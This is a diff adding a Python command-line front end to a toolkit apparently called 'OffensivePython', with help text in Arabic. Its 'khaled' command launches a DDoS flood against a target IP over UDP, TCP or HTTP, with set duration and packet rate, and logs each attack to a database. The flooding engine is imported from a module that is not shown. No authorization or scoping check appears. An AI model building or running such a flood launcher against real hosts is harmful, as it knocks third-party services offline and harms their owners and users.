@@ -1,0 +1,53 @@
+import click
+import asyncio
+import yaml
+from offensivepython.logger import setup_logger
+from offensivepython.tools.khaled import Khaled, InvalidTargetException
+from offensivepython.db import AttackLogger
+
+logger = setup_logger()
+
+def load_config():
+    try:
+        with open("offensivepython/config.yaml") as f:
+            return yaml.safe_load(f)
+    except Exception as e:
+        logger.warning(f"Failed to load config.yaml: {e}")
+        return {}
+
+@click.group()
+def cli():
+    """OffensivePython - مجموعة أدوات بايثون لاختبار الاختراق"""
+    pass
+
+@cli.command()
+@click.option('--target', '-t', required=True, help='عنوان الهدف (IP فقط حالياً)')
+@click.option('--port', '-p', default=None, type=int, help='رقم المنفذ')
+@click.option('--duration', '-d', default=None, type=int, help='مدة الهجوم (ثواني)')
+@click.option('--method', '-m', default=None, type=click.Choice(['UDP','TCP','HTTP']), help='نوع الهجوم')
+@click.option('--pps', default=None, type=int, help='عدد الحزم في الثانية')
+def khaled(target, port, duration, method, pps):
+    """بدء هجوم DDoS متعدد البروتوكولات باستخدام أداة خالد"""
+    config = load_config().get("default_attack", {})
+    port = port or config.get("port", 80)
+    duration = duration or config.get("duration", 10)
+    method = method or config.get("method", "UDP")
+    pps = pps or config.get("pps", 100)
+
+    try:
+        attack = Khaled(target, port, duration, method, pps)
+    except InvalidTargetException as e:
+        logger.error(f"خطأ في الهدف: {e}")
+        return
+    except Exception as e:
+        logger.error(f"خطأ في المعاملات: {e}")
+        return
+
+    db_logger = AttackLogger()
+    db_logger.log_attack(target, port, method, pps, duration)
+
+    asyncio.run(attack.attack())
+    db_logger.close()
+
+if __name__ == "__main__":
+    cli()
